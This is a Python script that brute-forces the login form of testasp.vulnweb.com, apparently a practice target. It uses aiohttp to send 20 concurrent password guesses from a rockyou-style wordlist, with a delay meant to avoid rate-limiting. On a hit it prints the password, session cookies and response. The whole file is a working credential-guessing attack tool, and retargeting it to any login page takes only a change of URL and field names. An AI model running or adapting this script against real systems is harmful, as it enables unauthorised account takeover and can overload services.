import aiohttp
import asyncio
import os
import time

async def try_password(session, url, username, password, data_template, semaphore):
    async with semaphore:
        data = data_template.copy()
        data["tfUPass"] = password
        try:
            async with session.post(url, data=data, timeout=5, allow_redirects=True) as res:
                text = await res.text()
                response_text = text.lower()
                success = "invalid login" not in response_text
                return {
                    "password": password,
                    "success": success,
                    "status": res.status,
                    "url": str(res.url),
                    "cookies": dict(res.cookies),
                    "response_text": response_text[:500]
                }
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            return {
                "password": password,
                "success": False,
                "status": None,
                "url": None,
                "cookies": {},
                "response_text": str(e)
            }

async def brute_force_login(username="admin", wordlist_path="/usr/share/wordlists/rockyou.txt", max_attempts=1000, concurrent_requests=20):
    url = "http://testasp.vulnweb.com/Login.asp"
    data_template = {
        "tfUName": username,
        "tfUPass": "",  # Filled per password
        "RetURL": "/Default.asp"
    }
    
    # Check wordlist
    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist not found at {wordlist_path}")
        print("Download rockyou.txt or specify the correct path (e.g., /usr/share/wordlists/rockyou.txt on Kali)")
        return
    
    print(f"Starting brute force attack on {url} with username '{username}'")
    print(f"Using wordlist: {wordlist_path}")
    print(f"Maximum attempts: {max_attempts}")
    print(f"Concurrent requests: {concurrent_requests}")
    
    attempt_count = 0
    success = False
    results = []
    
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(concurrent_requests)
        tasks = []
        
        try:
            with open(wordlist_path, "r", encoding="latin-1") as wordlist:
                for password in wordlist:
                    if attempt_count >= max_attempts:
                        break
                    password = password.strip()
                    if not password:
                        continue
                    attempt_count += 1
                    tasks.append(try_password(session, url, username, password, data_template, semaphore))
                    
                    # Process tasks in batches to avoid memory overload
                    if len(tasks) >= concurrent_requests:
                        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                        for result in batch_results:
                            if isinstance(result, Exception):
                                print(f"Error in batch: {result}")
                                continue
                            results.append(result)
                            if attempt_count % 100 == 0:
                                print(f"Attempt {attempt_count}: Tried password '{result['password']}'")
                            if result["success"]:
                                success = True
                                break
                        tasks = []
                        if success:
                            break
                    # Throttle to avoid rate-limiting
                    await asyncio.sleep(0.01)  # 10ms delay per password
                
                # Process remaining tasks
                if tasks and not success:
                    batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                    for result in batch_results:
                        if isinstance(result, Exception):
                            print(f"Error in final batch: {result}")
                            continue
                        results.append(result)
                        if attempt_count % 100 == 0:
                            print(f"Attempt {attempt_count}: Tried password '{result['password']}'")
                        if result["success"]:
                            success = True
                            break
                
        except FileNotFoundError:
            print(f"Error: Could not open wordlist at {wordlist_path}")
            return
        except Exception as e:
            print(f"Unexpected error: {e}")
            return
        
        # Report results
        if success:
            for result in results:
                if result["success"]:
                    print(f"\n*** Success ***")
                    print(f"Username: {username}")
                    print(f"Password: {result['password']}")
                    print(f"Status Code: {result['status']}")
                    print(f"Final URL: {result['url']}")
                    print(f"Cookies: {result['cookies']}")
                    print(f"Response Body (first 500 chars): {result['response_text']}")
                    break
            print("\nBrute force attack completed with successful login.")
        else:
            print(f"\nNo successful login found after {attempt_count} attempts.")

if __name__ == "__main__":
    asyncio.run(brute_force_login(
        username="admin",
        wordlist_path="./passwords.txt",
        max_attempts=100000,
        concurrent_requests=20
    ))